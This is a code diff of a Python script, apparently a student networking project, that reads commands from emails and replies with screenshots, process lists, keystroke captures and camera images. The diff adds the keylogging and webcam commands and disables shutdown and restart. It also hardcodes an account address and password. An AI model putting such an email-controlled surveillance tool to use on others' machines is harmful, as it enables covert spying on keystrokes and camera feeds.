@@ -6,7 +6,9 @@ import re
 
 from reply_screenshot import reply_screenshot
 from reply_process import reply_list_running_app, reply_stop_app
-from reply_shutdown_restart import reply_shutdown, reply_restart
+#from reply_shutdown_restart import reply_shutdown, reply_restart
+from reply_pressed_key import reply_pressed_key
+from reply_camera_capture import reply_camera_capture
 
 USERNAME = 'networkingass20120015@gmail.com'
 PASSWORD = 'DummyPassword123'
@@ -46,18 +48,24 @@ if __name__ == '__main__':
                         reply_screenshot(email_message, USERNAME, PASSWORD)
                     elif 'running app' in body_message:
                         reply_list_running_app(email_message, USERNAME, PASSWORD)
-                    elif 'stop app pid:' in body_message:
+                    elif 'stop app pid ' in body_message:
                         try:
-                            pid = int(re.match(r'.*stop app pid: (\d+).*', body_message).group(0))
+                            pid = int(re.match(r'.*stop app pid (\d+).*', body_message).group(0))
                             reply_stop_app(email_message, USERNAME, PASSWORD, pid)
                             print(pid)
                         except:
                             pass
                     elif 'shutdown' in body_message:
-                        reply_shutdown(email_message, USERNAME, PASSWORD)
+                        pass
+                        #reply_shutdown(email_message, USERNAME, PASSWORD)
                     elif 'restart' in body_message:
-                        reply_restart(email_message, USERNAME, PASSWORD)
-
+                        pass
+                        #reply_restart(email_message, USERNAME, PASSWORD)
+                    elif 'catch pressed key' in body_message:
+                        reply_pressed_key(email_message, USERNAME, PASSWORD)
+                    elif 'camera' in body_message:
+                        reply_camera_capture(email_message, USERNAME, PASSWORD)
+                        
                     retcode, data = conn.store(num, '+FLAGS', '(\\Seen)')
             
             time.sleep(5)
